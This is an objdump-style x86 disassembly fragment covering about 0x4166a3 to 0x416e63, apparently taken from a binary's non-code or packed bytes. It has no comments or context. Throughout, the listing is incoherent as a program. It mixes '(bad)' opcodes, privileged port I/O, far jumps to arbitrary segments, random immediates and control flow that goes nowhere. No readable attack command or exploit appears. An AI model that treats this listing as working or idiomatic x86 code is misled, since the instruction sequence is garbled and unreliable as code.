  4166a3:	test   eax,0xd081d1f
  4166a8:	push   ebx
  4166a9:	xor    ah,bl
  4166ab:	xchg   DWORD PTR [edx],ecx
  4166ad:	mov    WORD PTR [ecx+0x34071bd5],ss
  4166b3:	nop
  4166b4:	jmp    0x6a3a:0x71a3d294
  4166bb:	add    al,dh
  4166bd:	out    0x87,al
  4166bf:	iret   
  4166c0:	fimul  DWORD PTR [ebx+0x62]
  4166c3:	add    esp,eax
  4166c5:	mov    bl,0x6
  4166c7:	sbb    ecx,0x1e
  4166ca:	aad    0x6
  4166cc:	dec    ebp
  4166cd:	mov    edi,0x113c284f
  4166d2:	sbb    bl,BYTE PTR [edx]
  4166d4:	mov    ebx,0x806512fc
  4166d9:	cmp    BYTE PTR [eax+0x6d308ca6],ah
  4166df:	push   0x7
  4166e1:	mov    ecx,esp
  4166e3:	bound  esi,QWORD PTR [edi-0xf]
  4166e6:	inc    ebx
  4166e7:	cmp    eax,0x1ea7e72f
  4166ec:	adc    eax,0xc711d56c
  4166f1:	xor    al,0xb9
  4166f3:	jl     0x4166c6
  4166f5:	sub    edi,DWORD PTR [ebx+0x3f]
  4166f8:	fstp   st(1)
  4166fa:	out    0x89,al
  4166fc:	sbb    bh,BYTE PTR [edi+0x2b]
  4166ff:	push   ds
  416700:	cmp    esp,ebp
  416702:	adc    eax,0xea90138f
  416707:	mov    dl,0xe4
  416709:	retf   0x16c7
  41670c:	ror    BYTE PTR [ebp+0x15],1
  41670f:	stc    
  416710:	out    0xa3,al
  416712:	adc    DWORD PTR [ecx],ebp
  416714:	cmovb  esi,DWORD PTR [eax-0x765c803]
  41671b:	leave  
  41671c:	ret    0x343a
  41671f:	mov    ah,0xef
  416721:	xor    dl,BYTE PTR [esi]
  416723:	mov    WORD PTR [eax+ecx*2],?
  416726:	mov    ch,0xc6
  416728:	fs dec ebp
  41672a:	sub    eax,0x7c2241a3
  41672f:	popa   
  416730:	dec    ecx
  416731:	mov    bh,0x4b
  416733:	rcl    bh,1
  416735:	dec    ebp
  416736:	aaa    
  416737:	test   al,0xce
  416739:	enter  0xd407,0x60
  41673d:	push   ebp
  41673e:	(bad)  
  41673f:	sbb    ah,dh
  416741:	mov    ah,0x9e
  416743:	xor    DWORD PTR [ecx-0x3c],ebp
  416746:	or     DWORD PTR [edx+eax*2],esp
  416749:	je     0x416727
  41674b:	push   esp
  41674c:	lods   al,BYTE PTR ds:[esi]
  41674d:	and    al,0xf0
  41674f:	sbb    eax,0x3136cddc
  416754:	xor    eax,eax
  416756:	arpl   WORD PTR ds:0xcd79b473,cx
  41675c:	mov    ch,0xee
  41675e:	sub    eax,0xa2dede22
  416763:	jbe    0x4166e6
  416765:	je     0x41677f
  416767:	dec    ebp
  416768:	imul   eax,DWORD PTR [esi-0x75c06ebd],0xf3be183f
  416772:	mov    ecx,?
  416774:	lahf   
  416775:	dec    ecx
  416776:	and    DWORD PTR [esp+edi*2-0x79],eax
  41677a:	in     al,dx
  41677b:	push   esi
  41677c:	je     0x416723
  41677e:	cli    
  41677f:	xor    ecx,DWORD PTR [edi]
  416781:	dec    esp
  416782:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416783:	fcom   DWORD PTR [ebx+0x38fcf079]
  416789:	call   0xa177d634
  41678e:	(bad)  
  416790:	adc    eax,0xb01920d
  416795:	or     ch,ah
  416797:	add    edi,DWORD PTR [ecx+0x34]
  41679a:	in     eax,dx
  41679b:	pop    ebp
  41679c:	push   ebp
  41679d:	out    0x53,al
  41679f:	push   ss
  4167a0:	add    eax,0xf2cfa5f2
  4167a5:	or     BYTE PTR [ebx-0x7d],cl
  4167a8:	xchg   edi,eax
  4167a9:	mov    eax,ds:0x6062861f
  4167ae:	xchg   ecx,eax
  4167af:	or     DWORD PTR [esi+0x3e77518e],ebx
  4167b5:	mov    WORD PTR [eax+0x4ab69167],gs
  4167bb:	fdivr  QWORD PTR [edx-0x5e]
  4167be:	mov    esi,0xbc91c75c
  4167c3:	leave  
  4167c4:	pop    ebp
  4167c5:	call   0x536a513f
  4167ca:	shl    eax,0x5f
  4167cd:	mov    ah,0x61
  4167cf:	cmp    DWORD PTR [edi+0x69308b6d],edx
  4167d5:	sahf   
  4167d6:	mov    ecx,0x4cc975d8
  4167db:	std    
  4167dc:	lock test eax,0xf4755de2
  4167e2:	pop    edx
  4167e3:	mov    ss:0x54da4aff,eax
  4167e9:	mov    eax,0xe9568efd
  4167ee:	retf   0x8bb3
  4167f1:	aas    
  4167f2:	outs   dx,DWORD PTR ds:[esi]
  4167f3:	xor    eax,0x5fecae3f
  4167f8:	push   esp
  4167f9:	out    dx,al
  4167fa:	pop    ss
  4167fb:	sbb    eax,0x1338b2fd
  416800:	push   es
  416801:	push   0xd07da3ee
  416806:	jle    0x41680a
  416808:	pop    ecx
  416809:	int3   
  41680a:	pop    esp
  41680b:	gs (bad) 
  41680d:	mov    esp,0x4674aa0b
  416812:	ror    DWORD PTR [edx+esi*8-0x582fcafe],cl
  416819:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41681a:	jecxz  0x41679e
  41681c:	outs   dx,BYTE PTR ds:[esi]
  41681d:	dec    esi
  41681e:	add    ah,BYTE PTR [esi-0x1666071c]
  416824:	dec    ebx
  416825:	add    dh,BYTE PTR [ebp-0x7d8bbfa5]
  41682b:	mov    ds,WORD PTR [esp+eiz*8+0x667a0f50]
  416832:	ret    
  416833:	out    dx,al
  416834:	in     eax,dx
  416835:	jb     0x41689d
  416837:	shl    BYTE PTR [ebx+0x30],1
  41683a:	test   eax,0x3aceada7
  41683f:	jnp    0x416800
  416841:	jg     0x41680d
  416843:	shl    BYTE PTR [eax+0x65],1
  416846:	out    dx,eax
  416847:	shl    BYTE PTR [ebx-0x64976b9f],0x32
  41684e:	xor    bl,ah
  416850:	retf   
  416851:	pusha  
  416852:	cs push cs
  416854:	out    0x76,eax
  416856:	adc    eax,0x48e1417b
  41685b:	xchg   ebx,eax
  41685c:	outs   dx,DWORD PTR ds:[esi]
  41685d:	test   BYTE PTR ds:0x181683bf,al
  416863:	popf   
  416864:	cld    
  416865:	mov    ds:0xa749769,al
  41686a:	ror    DWORD PTR [edi+0xd6f1871],cl
  416870:	popa   
  416871:	cs popa 
  416873:	jbe    0x41680e
  416875:	adc    BYTE PTR [bx-0x2a],bh
  416879:	jbe    0x41682e
  41687b:	jae    0x4168d2
  41687d:	mov    dl,0x1e
  41687f:	test   BYTE PTR [esi],dh
  416881:	retf   
  416882:	and    eax,0xa0a86d00
  416887:	shl    esi,0xed
  41688a:	lahf   
  41688b:	pop    ebp
  41688c:	mov    WORD PTR [ebx+0x3c],cs
  41688f:	mov    ds:0xf723f9f1,al
  416894:	test   BYTE PTR [ebp-0x28907e71],0x28
  41689b:	sbb    dl,BYTE PTR [edx+0x7e]
  41689e:	xchg   BYTE PTR [edx],dh
  4168a0:	inc    ebp
  4168a1:	inc    esi
  4168a2:	sbb    cl,cl
  4168a4:	stos   BYTE PTR es:[edi],al
  4168a5:	bound  ecx,QWORD PTR [eax-0x56]
  4168a8:	cs sub eax,0x28d4481
  4168ae:	xchg   BYTE PTR [edx],dl
  4168b0:	sbb    DWORD PTR [ebx],esp
  4168b2:	hlt    
  4168b3:	mov    BYTE PTR [ebx-0x2725f7da],dl
  4168b9:	push   eax
  4168ba:	cmp    edx,DWORD PTR ds:0xd31d6097
  4168c0:	out    0x4c,al
  4168c2:	pushf  
  4168c3:	lods   al,BYTE PTR ds:[esi]
  4168c4:	xor    DWORD PTR [ecx+eax*1-0x5f],eax
  4168c8:	mov    cl,0xbc
  4168ca:	mov    ah,0xb7
  4168cc:	jecxz  0x4168be
  4168ce:	fld    st(5)
  4168d0:	push   esi
  4168d1:	outs   dx,DWORD PTR ds:[esi]
  4168d2:	inc    DWORD PTR [eax+0x4b30865b]
  4168d8:	idiv   BYTE PTR [ebp+0x284c72f3]
  4168de:	mov    dh,0xd
  4168e0:	pusha  
  4168e1:	pop    eax
  4168e2:	sub    DWORD PTR [ecx],edi
  4168e4:	jle    0x416926
  4168e6:	test   al,0x98
  4168e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4168e9:	daa    
  4168ea:	call   0xa8ed523c
  4168ef:	xor    cl,BYTE PTR [esi-0x34]
  4168f2:	call   0x3c81e4b3
  4168f7:	push   ebp
  4168f8:	pop    esi
  4168f9:	call   0x3aa0:0x65fa12f1
  416900:	jnp    0x416928
  416902:	push   esp
  416903:	or     BYTE PTR [eax],dl
  416905:	xor    DWORD PTR [ebx+0x7dcb3ac4],esp
  41690b:	scas   al,BYTE PTR es:[edi]
  41690c:	fs je  0x41697e
  41690f:	ss (bad) 
  416911:	jp     0x41695c
  416913:	cmp    BYTE PTR [ebx],bh
  416915:	es call 0x1e5:0xba7c2772
  41691d:	adc    DWORD PTR [edx-0x11d5994f],ebp
  416923:	xchg   esi,eax
  416924:	cmp    dl,dl
  416926:	mov    gs,WORD PTR [esi+0x6ebf7fa0]
  41692c:	retf   0x79d0
  41692f:	pop    ss
  416930:	mov    bl,0x53
  416932:	int3   
  416933:	dec    edi
  416934:	sub    ebx,ecx
  416936:	cli    
  416937:	cwde   
  416938:	test   DWORD PTR [ecx-0xc],edx
  41693b:	mov    edi,0x21482c27
  416940:	lds    ecx,FWORD PTR [ebp+0x7c3da493]
  416946:	int3   
  416947:	dec    ecx
  416948:	cmp    al,0xae
  41694a:	mov    ebx,0xa803d5d6
  41694f:	adc    al,0xc1
  416951:	mov    dh,0xbc
  416953:	xchg   esi,eax
  416954:	lahf   
  416955:	scas   eax,DWORD PTR es:[edi]
  416956:	inc    esi
  416957:	push   esi
  416958:	aaa    
  416959:	sub    cl,bl
  41695b:	pop    ecx
  41695c:	repz mov al,ah
  41695f:	sbb    DWORD PTR [eax-0x3d],0x84f4e8d2
  416966:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416967:	test   BYTE PTR [edi-0x1fe28ea7],dl
  41696d:	cmp    al,0xa2
  41696f:	test   eax,0xce97e534
  416974:	aas    
  416975:	cs imul edx,ebx,0xb23e7e1
  41697c:	xlat   BYTE PTR ds:[ebx]
  41697d:	nop
  41697e:	sbb    BYTE PTR [ecx-0x2c1524b1],cl
  416984:	push   esp
  416985:	push   esi
  416986:	in     al,0xe4
  416988:	aam    0x62
  41698a:	retf   0xb8ca
  41698d:	mov    dl,0x1d
  41698f:	xchg   ecx,eax
  416990:	jns    0x4169df
  416992:	sub    ebp,DWORD PTR [esi]
  416994:	outs   dx,DWORD PTR ds:[esi]
  416995:	mov    eax,ds:0x47a5bf05
  41699a:	or     eax,0xc90df315
  41699f:	lods   eax,DWORD PTR ds:[esi]
  4169a0:	(bad)  
  4169a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169a2:	mov    cl,0xa2
  4169a4:	jnp    0x41692d
  4169a6:	jno    0x416a02
  4169a8:	sti    
  4169a9:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  4169ab:	cs lock loope 0x41696d
  4169af:	out    dx,eax
  4169b0:	outs   dx,BYTE PTR ds:[esi]
  4169b1:	mov    bl,al
  4169b3:	shl    al,cl
  4169b5:	es mov al,0x72
  4169b8:	es and esp,edx
  4169bb:	pop    ebx
  4169bc:	mov    bl,0x8f
  4169be:	pop    es
  4169bf:	or     al,0x45
  4169c1:	(bad)  
  4169c2:	mov    dh,0x90
  4169c4:	ins    DWORD PTR es:[edi],dx
  4169c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169c6:	out    0x50,eax
  4169c8:	dec    esp
  4169c9:	lahf   
  4169ca:	cmc    
  4169cb:	mov    edi,0xc82adb77
  4169d0:	gs sbb esi,edx
  4169d3:	into   
  4169d4:	fcom   DWORD PTR [edx-0xd]
  4169d7:	cli    
  4169d8:	pop    edx
  4169d9:	repz sbb bl,BYTE PTR fs:[ecx+ebp*8+0x13]
  4169df:	les    eax,FWORD PTR [esi-0x40]
  4169e2:	mov    esp,0x4e3a73ab
  4169e7:	mov    ds:0xadab1940,al
  4169ec:	or     al,0xc
  4169ee:	aaa    
  4169ef:	and    DWORD PTR [ebx-0x7c],esp
  4169f2:	mov    ch,0x60
  4169f4:	xchg   DWORD PTR [ecx+0xe4ad0f8],esp
  4169fa:	stc    
  4169fb:	cmp    DWORD PTR [ecx-0x6af9efd7],edx
  416a01:	xchg   BYTE PTR [esi-0x1d],bh
  416a04:	imul   esp,DWORD PTR [edi+edi*8-0x2e],0xfffffff4
  416a09:	mov    bh,dh
  416a0b:	mov    edi,0x335c5739
  416a10:	data16 mov gs,WORD PTR [ebp+eiz*1+0x6980fb38]
  416a18:	push   edi
  416a19:	test   al,0xb5
  416a1b:	cmc    
  416a1c:	sti    
  416a1d:	enter  0x4e78,0x22
  416a21:	hlt    
  416a22:	xchg   edx,eax
  416a23:	in     al,dx
  416a24:	rol    BYTE PTR [ebp-0x692ed8b5],0xe4
  416a2b:	repz dec esi
  416a2d:	xor    eax,0xe6784592
  416a32:	mov    ecx,0x72fdc5b8
  416a37:	dec    ebx
  416a38:	pop    esp
  416a39:	js     0x416a6f
  416a3b:	sub    BYTE PTR [edi+0x3e8e221e],ch
  416a41:	sub    edi,DWORD PTR [ecx+0x2c]
  416a44:	inc    esi
  416a45:	std    
  416a46:	out    dx,al
  416a47:	mov    edi,0x9f968a7f
  416a4c:	dec    esp
  416a4d:	lea    esp,[eax+0x6ecfd5d1]
  416a53:	jp     0x416a89
  416a55:	push   cs
  416a56:	sub    eax,0xaddd8751
  416a5b:	cli    
  416a5c:	mov    dl,0x1e
  416a5e:	and    eax,0x1d13a327
  416a63:	inc    eax
  416a64:	xchg   esp,eax
  416a65:	adc    eax,0x6608b5a1
  416a6a:	in     al,dx
  416a6b:	sahf   
  416a6c:	icebp  
  416a6d:	fldz   
  416a6f:	outs   dx,DWORD PTR ds:[esi]
  416a70:	ret    
  416a71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a72:	jg     0x416a95
  416a74:	xchg   edi,eax
  416a75:	test   BYTE PTR [esp+esi*8-0x6f50de64],al
  416a7c:	pop    ss
  416a7d:	loop   0x416a7e
  416a7f:	dec    ebp
  416a80:	pop    eax
  416a81:	fs repnz mov cs,ecx
  416a85:	cmp    dl,bl
  416a87:	jp     0x416a77
  416a89:	xor    al,ch
  416a8b:	inc    edx
  416a8c:	es seta bh
  416a90:	mov    eax,0xd8caf36a
  416a95:	int    0x5c
  416a97:	push   eax
  416a98:	adc    al,0xdf
  416a9a:	das    
  416a9b:	push   ebx
  416a9c:	dec    esp
  416a9d:	or     bh,BYTE PTR [edx-0x50c1e828]
  416aa3:	repnz mov cl,0x22
  416aa6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416aa7:	add    BYTE PTR [ecx+0x75],0xdd
  416aab:	cmp    BYTE PTR [ebp+0x69],0xdb
  416aaf:	mov    ecx,0x21f03eb5
  416ab4:	xchg   ebp,eax
  416ab5:	std    
  416ab6:	pop    DWORD PTR [ecx]
  416ab8:	bound  eax,QWORD PTR [ecx-0x26521946]
  416abe:	mov    dl,0x4c
  416ac0:	jecxz  0x416ad2
  416ac2:	stos   BYTE PTR es:[edi],al
  416ac3:	jmp    0x7efb:0xdcc60cb4
  416aca:	gs mov bl,0x2e
  416acd:	hlt    
  416ace:	(bad)  
  416acf:	mov    ebx,0x3d0c2e11
  416ad4:	enter  0x2b99,0x41
  416ad8:	inc    esi
  416ad9:	jo     0x416a7c
  416adb:	mov    esp,DWORD PTR [esi+edx*1+0x21]
  416adf:	sub    dl,BYTE PTR [ebx]
  416ae1:	stos   DWORD PTR es:[edi],eax
  416ae2:	rol    DWORD PTR [ecx+0x5f],1
  416ae5:	push   0x5e
  416ae7:	int3   
  416ae8:	fcmovb st,st(4)
  416aea:	inc    eax
  416aeb:	retf   
  416aec:	pop    esi
  416aed:	stos   DWORD PTR es:[edi],eax
  416aee:	or     dh,BYTE PTR [ebx+0x24]
  416af1:	add    DWORD PTR [edx+0x20],0x97cef556
  416af8:	add    ecx,DWORD PTR [eax+0x58]
  416afb:	cs mov ch,0x73
  416afe:	leave  
  416aff:	inc    ebx
  416b00:	cmp    al,0x96
  416b02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b03:	pop    ecx
  416b04:	dec    eax
  416b05:	jp     0x416ae1
  416b07:	imul   eax,DWORD PTR [ebp+eax*4+0x18],0x6b
  416b0c:	pop    ecx
  416b0d:	out    0x4d,al
  416b0f:	test   BYTE PTR [edx-0x2657b78d],bl
  416b15:	aaa    
  416b16:	out    0xbc,eax
  416b18:	sub    al,BYTE PTR [esi]
  416b1a:	add    al,0x40
  416b1c:	in     eax,0xd7
  416b1e:	cmp    DWORD PTR [ebp+0x462b407a],esp
  416b24:	retf   0x234d
  416b27:	sbb    bl,BYTE PTR [ebx-0x6a456679]
  416b2d:	fincstp 
  416b2f:	rep outs dx,BYTE PTR ds:[esi]
  416b31:	sub    ah,al
  416b33:	repnz fcomp QWORD PTR [esp+edx*8+0x20d74ba5]
  416b3b:	dec    eax
  416b3c:	jne    0x416b01
  416b3e:	jp     0x416ba0
  416b40:	sbb    al,0x93
  416b42:	aad    0x30
  416b44:	scas   eax,DWORD PTR es:[edi]
  416b45:	inc    esp
  416b46:	xor    ebx,edx
  416b48:	or     eax,0xa1485d2d
  416b4d:	popa   
  416b4e:	into   
  416b4f:	je     0x416bc0
  416b51:	repz sti 
  416b53:	cmp    edi,esp
  416b55:	sbb    edi,DWORD PTR [ebp+0x70]
  416b58:	ds fwait
  416b5a:	loop   0x416af1
  416b5c:	in     eax,0xd6
  416b5e:	fsub   st(0),st
  416b60:	imul   DWORD PTR [edi]
  416b62:	and    cl,bl
  416b64:	pop    edx
  416b65:	push   esp
  416b66:	ret    0x9f5c
  416b69:	or     bh,BYTE PTR [eax-0x69]
  416b6c:	xor    edx,DWORD PTR [ebx]
  416b6e:	xor    BYTE PTR [edi+0x3c08e6b8],ah
  416b74:	fisttp QWORD PTR ds:0x4129afeb
  416b7a:	in     al,0x68
  416b7c:	(bad)  
  416b7d:	stc    
  416b7e:	mov    ah,0xfe
  416b80:	adc    al,0xd8
  416b82:	cwde   
  416b83:	stos   DWORD PTR es:[edi],eax
  416b84:	or     eax,0x36d512a7
  416b89:	jno    0x416baa
  416b8b:	(bad)  
  416b8c:	data16 add cl,BYTE PTR [eax]
  416b8f:	in     al,0xa2
  416b91:	nop
  416b92:	mov    dh,dh
  416b94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b95:	or     edx,DWORD PTR [edx-0x2a]
  416b98:	push   esp
  416b99:	adc    DWORD PTR [ecx-0x4eb12a4],eax
  416b9f:	push   es
  416ba0:	(bad)  
  416ba1:	mov    cl,0x66
  416ba3:	fsub   QWORD PTR [eax-0x747b9910]
  416ba9:	jo     0x416c28
  416bab:	cli    
  416bac:	add    DWORD PTR [edi+0x12317803],edx
  416bb2:	push   eax
  416bb3:	jecxz  0x416bc8
  416bb5:	popf   
  416bb6:	shr    DWORD PTR [esi-0x553549fb],cl
  416bbc:	fsubp  st(4),st
  416bbe:	sub    eax,DWORD PTR [edi]
  416bc0:	inc    esi
  416bc1:	pop    eax
  416bc2:	mov    al,0x44
  416bc4:	xlat   BYTE PTR ds:[ebx]
  416bc5:	sbb    al,0xa8
  416bc7:	lahf   
  416bc8:	in     eax,0xb3
  416bca:	and    esi,DWORD PTR [ecx+ebp*1+0x6b]
  416bce:	clc    
  416bcf:	mov    cl,0x8d
  416bd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416bd2:	push   ebx
  416bd3:	add    edx,esp
  416bd5:	and    eax,0x70684e6
  416bda:	or     eax,0x6ff5210d
  416bdf:	dec    edx
  416be0:	xchg   ecx,eax
  416be1:	jmp    0x416bb1
  416be3:	dec    ecx
  416be4:	or     DWORD PTR [edx-0x2159542],ebp
  416bea:	mov    ebx,0xcb2d8d21
  416bef:	xor    ebx,DWORD PTR [edx+esi*2]
  416bf2:	faddp  st(2),st
  416bf4:	and    edx,edi
  416bf6:	aam    0x78
  416bf8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416bf9:	cs call 0x5b563ff1
  416bff:	push   esp
  416c00:	addr16 std 
  416c02:	adc    bl,ch
  416c04:	inc    esi
  416c06:	adc    ch,BYTE PTR [edx+edx*8+0x2d0d54fa]
  416c0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c0e:	(bad)  
  416c0f:	call   FWORD PTR [esi-0x3ac73ddf]
  416c15:	js     0x416c44
  416c17:	mov    ch,0x30
  416c19:	push   ds
  416c1a:	ficomp DWORD PTR [edx+ebx*2+0x65]
  416c1e:	cmp    esp,ebp
  416c20:	push   eax
  416c21:	pop    edx
  416c22:	inc    edx
  416c23:	sub    eax,0x57c893bc
  416c28:	pop    eax
  416c29:	xchg   edi,eax
  416c2a:	cmp    edx,DWORD PTR [edi-0x13e55b3]
  416c30:	xor    BYTE PTR [ebp+0x6],al
  416c33:	test   DWORD PTR ds:0xec072887,eax
  416c39:	lods   al,BYTE PTR ds:[esi]
  416c3a:	stc    
  416c3b:	jae    0x416c87
  416c3d:	aam    0x86
  416c3f:	xchg   edi,eax
  416c40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c41:	pop    edi
  416c42:	pop    ds
  416c43:	loopne 0x416c0c
  416c45:	adc    edi,DWORD PTR [ebp+0x7d613862]
  416c4b:	test   al,0x55
  416c4d:	xor    DWORD PTR [esi+0x5e1d5515],0xffffffa1
  416c54:	push   cs
  416c55:	push   esp
  416c56:	jnp    0x416c36
  416c58:	cli    
  416c59:	jg     0x416cb7
  416c5b:	leave  
  416c5c:	aas    
  416c5d:	leave  
  416c5e:	loopne 0x416c31
  416c60:	retf   
  416c61:	retf   
  416c62:	cs ret 0x40fa
  416c66:	add    bh,ch
  416c68:	movd   mm1,ebx
  416c6b:	pop    ebp
  416c6c:	lock daa 
  416c6e:	add    ecx,DWORD PTR [edx]
  416c70:	ins    DWORD PTR es:[edi],dx
  416c71:	jmp    0x416c84
  416c73:	out    dx,al
  416c74:	repz xchg ecx,eax
  416c76:	imul   esi,DWORD PTR [edi-0x1],0xffffffa8
  416c7a:	sub    al,0x35
  416c7c:	push   0xffffffcc
  416c7e:	sbb    al,ch
  416c80:	fdivr  DWORD PTR ds:0x528c1efe
  416c86:	(bad)  
  416c87:	and    ebx,eax
  416c89:	imul   eax,DWORD PTR [edi+eax*1-0x122fc277],0xffffff98
  416c91:	retf   0x3153
  416c94:	stc    
  416c95:	aam    0xc6
  416c97:	mov    cl,0x99
  416c99:	pop    ds
  416c9a:	or     dl,BYTE PTR [edi-0x4dc829d1]
  416ca0:	shl    BYTE PTR [ebx],0x4
  416ca3:	popa   
  416ca4:	mov    ds,WORD PTR [edi]
  416ca6:	gs push 0x6f743d91
  416cac:	sub    DWORD PTR [ebp-0x46],esp
  416caf:	out    0x1f,al
  416cb1:	out    dx,al
  416cb2:	je     0x416c7d
  416cb4:	aaa    
  416cb5:	mov    ds:0x5ad7cbb2,al
  416cba:	into   
  416cbb:	xchg   esp,eax
  416cbc:	push   ss
  416cbd:	lahf   
  416cbe:	add    al,0x96
  416cc0:	loop   0x416ce8
  416cc2:	je     0x416cae
  416cc4:	neg    DWORD PTR [eax-0x19]
  416cc7:	pop    es
  416cc8:	and    bl,dl
  416cca:	scas   eax,DWORD PTR es:[edi]
  416ccb:	cwde   
  416ccc:	jnp    0x416c55
  416cce:	pop    ebp
  416ccf:	repz loope 0x416ca9
  416cd2:	or     cl,ch
  416cd4:	pushf  
  416cd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416cd6:	sub    eax,0x3fbc6303
  416cdb:	daa    
  416cdc:	fst    DWORD PTR [edi-0x2ccf53bb]
  416ce2:	out    0x4e,al
  416ce4:	xor    eax,0xdef338a5
  416ce9:	push   edx
  416cea:	mov    esp,0xc0461546
  416cef:	stc    
  416cf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416cf1:	pop    es
  416cf2:	sub    DWORD PTR [edx+0x5],esi
  416cf5:	xchg   edi,eax
  416cf6:	mov    ebx,DWORD PTR [edx-0x20]
  416cf9:	test   BYTE PTR [edi-0x5d],cl
  416cfc:	add    DWORD PTR [eax+ecx*8+0x56031aef],edi
  416d03:	scas   eax,DWORD PTR es:[edi]
  416d04:	xlat   BYTE PTR ds:[ebx]
  416d05:	add    eax,0xb40d8919
  416d0a:	cmp    DWORD PTR [eax+0x68],ebp
  416d0d:	and    eax,0xe5f13a5f
  416d12:	aas    
  416d13:	mov    ah,0x45
  416d15:	add    ebp,DWORD PTR [edx+0x677d6126]
  416d1b:	int    0x2a
  416d1d:	push   esp
  416d1e:	test   DWORD PTR [esi],ebx
  416d20:	dec    ecx
  416d21:	cdq    
  416d22:	jb     0x416d55
  416d24:	retf   
  416d25:	or     ebx,DWORD PTR [edx-0x49d46c1f]
  416d2b:	mov    eax,edi
  416d2d:	cmp    ebx,edi
  416d2f:	push   ss
  416d30:	mov    al,ds:0xf2946db9
  416d35:	mov    cl,0xc7
  416d37:	jmp    0xd6c1feb6
  416d3c:	ins    DWORD PTR es:[edi],dx
  416d3d:	call   0xa015:0xa9a95310
  416d44:	int3   
  416d45:	mov    esp,0xfaea3922
  416d4a:	ja     0x416d37
  416d4c:	jns    0x416ceb
  416d4e:	inc    BYTE PTR [edx]
  416d50:	ret    0xae85
  416d53:	and    edi,ebx
  416d55:	inc    ebp
  416d56:	addr16 cdq 
  416d58:	icebp  
  416d59:	shl    BYTE PTR [eax+0x40],1
  416d5c:	pop    eax
  416d5d:	jge    0x416cfb
  416d5f:	inc    esp
  416d60:	enter  0x6916,0x7a
  416d64:	push   ss
  416d65:	sbb    BYTE PTR [edx],bl
  416d67:	(bad)  
  416d68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d69:	and    eax,0x2d7a50
  416d6e:	test   BYTE PTR [ebp-0x24],bh
  416d71:	inc    esi
  416d72:	push   eax
  416d73:	jmp    0x416d23
  416d75:	sbb    dl,al
  416d77:	nop
  416d78:	in     al,0x96
  416d7a:	or     DWORD PTR [edi+0x742f05f],esi
  416d80:	sar    DWORD PTR [ecx],1
  416d82:	fsubr  QWORD PTR [esi]
  416d84:	stos   BYTE PTR es:[edi],al
  416d85:	pop    esi
  416d86:	pop    edi
  416d87:	das    
  416d88:	mov    ah,0xdd
  416d8a:	(bad)  
  416d8b:	rol    DWORD PTR [ebx],1
  416d8d:	xchg   esp,eax
  416d8e:	out    dx,al
  416d8f:	xchg   ebx,eax
  416d90:	popa   
  416d91:	jmp    0x96a8:0x4e13dbd8
  416d98:	push   ebx
  416d99:	pop    edi
  416d9a:	xchg   BYTE PTR [ebp+0x4079960d],cl
  416da0:	sub    edx,ebp
  416da2:	mov    WORD PTR [edx],?
  416da4:	mov    ah,0x68
  416da6:	push   0x33
  416da8:	dec    edi
  416da9:	xchg   ebx,eax
  416daa:	outs   dx,BYTE PTR ds:[esi]
  416dab:	mov    al,ds:0x9264b7db
  416db0:	jle    0x416dcf
  416db2:	mov    ebx,0xfbddf396
  416db7:	add    al,0x51
  416db9:	(bad)  
  416dba:	(bad)  
  416dbb:	cmp    ebx,ebx
  416dbd:	add    DWORD PTR [ebp-0x69119996],0x1e
  416dc4:	xchg   ecx,eax
  416dc5:	aam    0xb4
  416dc7:	test   DWORD PTR [eax],0x5c621d52
  416dcd:	cmc    
  416dce:	push   ebp
  416dcf:	jmp    0x4ea7:0xc551a2
  416dd6:	push   0xffffff89
  416dd8:	out    dx,al
  416dd9:	ja     0x416d71
  416ddb:	cmc    
  416ddc:	fcomi  st,st(2)
  416dde:	cmp    esp,ebx
  416de0:	(bad)  
  416de1:	retf   0x6ea4
  416de4:	mov    ah,0x3b
  416de6:	mov    cl,dh
  416de8:	rol    DWORD PTR [ebp-0x21f8f67e],1
  416dee:	mov    DWORD PTR [eax],0xbac1acd1
  416df4:	or     BYTE PTR [ebx-0x73],ch
  416df7:	jg     0x416e5d
  416df9:	push   esi
  416dfa:	cs iret 
  416dfc:	inc    edx
  416dfd:	in     eax,0x64
  416dff:	pop    es
  416e00:	push   gs
  416e02:	xchg   BYTE PTR cs:[ebx],cl
  416e05:	adc    ah,dl
  416e07:	and    BYTE PTR [esp+edx*2],ah
  416e0a:	dec    eax
  416e0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e0c:	mov    cl,0xe7
  416e0e:	or     eax,DWORD PTR ds:0x9c8a0188
  416e14:	add    ebx,DWORD PTR [esi-0x49c0e56e]
  416e1a:	mul    BYTE PTR [ebp-0x774df418]
  416e20:	arpl   WORD PTR [ebp+0x517af550],si
  416e26:	fcmovbe st,st(3)
  416e28:	sub    eax,0xd1f93a7a
  416e2d:	idiv   BYTE PTR [eax+ecx*4+0x56866432]
  416e34:	pop    ecx
  416e35:	into   
  416e36:	test   dl,dl
  416e38:	cmp    BYTE PTR [ecx-0x1b],ah
  416e3b:	fwait
  416e3c:	adc    DWORD PTR [esi+0x38],0x7f29e772
  416e43:	xchg   ebx,eax
  416e44:	and    ebp,DWORD PTR [eax-0x60]
  416e47:	mov    ch,0x60
  416e49:	fwait
  416e4a:	int3   
  416e4b:	div    BYTE PTR [edi+esi*2-0x67]
  416e4f:	or     eax,0xea279d46
  416e54:	mov    ch,0xb2
  416e56:	addr16 lahf 
  416e58:	and    DWORD PTR [eax-0x6de0374b],esp
  416e5e:	js     0x416ec7
  416e60:	lds    esp,FWORD PTR [eax-0x3c]
  416e63:	and    BYTE PTR [ebp*8+0x2fe12a30],bl
